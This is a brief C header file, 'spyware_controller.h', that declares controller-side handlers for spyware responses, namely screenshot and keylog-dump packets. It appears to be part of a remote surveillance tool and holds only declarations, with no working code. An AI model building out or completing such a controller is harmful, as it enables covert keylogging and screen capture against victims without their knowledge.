#ifndef SPYWARE_CONTROLLER_H
#define SPYWARE_CONTROLLER_H

#include "protocol.h"

/* Handlers for spyware responses on the controller side */
void handle_screenshot_response(Packet *resp);
void handle_keylog_dump_response(Packet *resp);

#endif /* SPYWARE_CONTROLLER_H */
